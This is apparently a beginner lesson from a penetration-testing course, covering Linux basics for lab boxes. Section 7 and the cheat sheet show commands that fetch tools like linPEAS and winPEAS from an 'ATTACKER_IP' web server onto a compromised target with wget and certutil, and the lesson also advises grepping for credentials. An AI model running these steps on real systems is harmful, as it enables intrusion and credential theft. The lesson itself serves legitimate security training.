@@ -1,0 +1,136 @@
+# Module 0 — Lesson 2: Linux Command-Line Primer
+
+**Why this lesson:** every attack in this course is typed into a Linux terminal. You don't need to be a Linux expert, but you need to move around, read files, set permissions, and transfer tools without thinking about it. This lesson covers exactly the commands the rest of the course uses — no more.
+
+If you're comfortable in a terminal already, skim the table in Section 8 and the "gotchas" in Section 7, then move on.
+
+---
+
+## 1. The terminal, in one paragraph
+
+The terminal (or "shell") is a text way to control the computer. You type a command, press Enter, it runs, you read the output. A command is usually `program  options  target`, for example `nmap -sV 10.10.10.5` = run `nmap`, with option `-sV`, against `10.10.10.5`. Options starting with `-` (like `-l`) or `--` (like `--min-rate`) are called **flags**; they change how the program behaves. This course explains every flag it uses.
+
+---
+
+## 2. Moving around the filesystem
+
+Linux files live in a tree starting at `/` (the "root" of the filesystem). Your files are under `/home/yourname` (also written `~`).
+
+```bash
+pwd                 # print working directory — "where am I?"
+ls                  # list files here
+ls -la              # list ALL files (incl. hidden) with details/permissions
+cd /tmp             # change directory to /tmp
+cd ~                # go home
+cd ..               # go up one level
+```
+- Hidden files start with a `.` (like `.ssh`, `.bash_history`) — `ls` hides them, `ls -la` shows them. On a hacked box these hidden files often hold credentials, so always `ls -la`.
+
+---
+
+## 3. Reading and searching files
+
+```bash
+cat notes.txt                 # dump a whole file to the screen
+less bigfile.txt              # scroll a big file (q to quit)
+head -n 20 file.txt           # first 20 lines
+grep "password" file.txt      # print lines containing "password"
+grep -rin "pass" /home        # search RECURSIVELY, case-Insensitive, with liNe numbers
+```
+- `grep` is your search tool. `-r` recurse into folders, `-i` ignore case, `-n` show line numbers. You'll use `grep -rin` constantly to hunt for credentials.
+
+---
+
+## 4. Making things and moving them
+
+```bash
+mkdir loot                    # make a directory called loot
+mkdir -p scans/nmap           # make nested dirs in one go (-p = parents)
+cp report-template.md mine.md # copy a file
+mv old.txt new.txt            # move/rename
+rm file.txt                   # delete a file (no undo — be careful)
+```
+
+> **First-run gotcha you WILL hit:** some lessons save output into a subfolder, e.g. `nmap ... -oN nmap/allports.txt`. If the `nmap/` folder doesn't exist yet, the command errors with *"Failed to open output file."* Fix: make it first. A good habit at the start of each box:
+> ```bash
+> mkdir -p ~/thm/boxname/&#123;nmap,ffuf,loot&#125;
+> cd ~/thm/boxname
+> ```
+> Now your output folders exist and everything for this box is in one place (which also becomes your report evidence).
+
+---
+
+## 5. Permissions and running programs
+
+Linux controls who can read/write/execute each file. Two things you need:
+
+```bash
+./linpeas.sh                  # run a program in the CURRENT folder (the ./ matters)
+chmod +x linpeas.sh           # make a file executable first
+```
+- **Why `./`?** For safety, Linux doesn't run programs from the current folder unless you say `./` (dot-slash = "right here").
+- **Why `chmod +x`?** A file you just downloaded usually isn't marked runnable. `chmod +x` adds the "execute" permission. **If you download a script or binary and get *"Permission denied"*, you forgot `chmod +x`.** This applies to linPEAS, chisel, Ligolo's `agent`/`proxy`, and any tool you fetch.
+
+---
+
+## 6. sudo — running as administrator
+
+```bash
+sudo openvpn user.ovpn        # run this command as root (admin)
+sudo apt install nmap         # install software
+```
+- `sudo` = "do this as the superuser (root)." Some actions (changing the network, installing software, reading protected files) need it. It'll ask for your password the first time.
+- **root** is the all-powerful admin account on Linux — the equivalent of "Administrator" on Windows. Getting *to* root on a target is the whole goal of privilege escalation (see `network/03`).
+
+---
+
+## 7. Getting tools onto a target (you'll do this a lot)
+
+Once you have a shell on a victim, you often need to copy a tool (like linPEAS) *onto* it. The standard trick: run a tiny web server on **your** Kali box, then download from the target.
+
+**On your Kali box (in the folder with the tool):**
+```bash
+python3 -m http.server 80
+```
+- This serves the current folder over HTTP on port 80. Leave it running.
+
+**On the target (in its shell):**
+```bash
+wget http://ATTACKER_IP/linpeas.sh      # Linux target
+# or on Windows:
+certutil -urlcache -f http://ATTACKER_IP/winPEAS.exe wp.exe
+```
+- `ATTACKER_IP` is your `tun0` address (from `labs/01`). The target reaches back to your web server and pulls the file.
+- Then on the target: `chmod +x linpeas.sh` and `./linpeas.sh`.
+
+This one pattern — **serve on Kali, fetch on target** — is how every "transfer the binary" instruction in the course actually happens.
+
+---
+
+## 8. The cheat sheet (bookmark this)
+
+| Task | Command |
+|---|---|
+| Where am I | `pwd` |
+| List all incl. hidden | `ls -la` |
+| Change dir / up / home | `cd path` / `cd ..` / `cd ~` |
+| Read file | `cat f` / `less f` |
+| Search files | `grep -rin "term" /path` |
+| Make dirs | `mkdir -p a/b/c` |
+| Copy / move / delete | `cp` / `mv` / `rm` |
+| Make runnable | `chmod +x file` |
+| Run local program | `./file` |
+| As admin | `sudo command` |
+| Serve files (Kali) | `python3 -m http.server 80` |
+| Fetch on target | `wget http://ATTACKER_IP/file` |
+| Your VPN IP | `ip addr show tun0` |
+
+---
+
+## 9. Carry forward
+
+- A command is `program flags target`; this course explains every flag.
+- `mkdir -p` your output folders *before* scanning, and `chmod +x` anything you download — these two habits prevent the most common beginner errors.
+- "Serve on Kali (`python3 -m http.server`), fetch on target (`wget`/`certutil`)" is how tools get onto victims.
+
+**Next lesson:** `labs/03-networking-and-shells-primer.md` — ports, protocols, and what a "shell" actually is, so the attack lessons make sense.
